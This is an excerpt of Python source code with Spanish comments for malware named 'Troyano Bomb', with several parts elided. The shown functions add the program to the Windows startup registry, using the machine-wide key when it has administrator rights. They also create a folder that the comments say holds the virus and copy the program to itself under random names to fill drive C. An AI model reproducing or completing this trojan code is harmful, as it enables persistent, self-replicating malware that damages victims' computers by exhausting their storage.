...
def addStartup(): 
    ...
    name = "Troyano Bomb"                                                       # Nombre del StartUp
    ...
    try:    # Solo si tiene permisos de administrador
        registry = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS) # maquina
...
def CreateFileMain():   # Crea carpeta que contiene el virus
        try:  # Intenta crear la dirección 
            ...
            return False
        pass
def AutoCopy():         # Se replica en el sistema, (Satura la Unidad:C)
    def random_char(y):
           return ''.join(random.choice(string.ascii_letters) for x in range(y))
    nameKey     = "Troyano Bomb" # Nombre del virus
    user        = str(getuser())
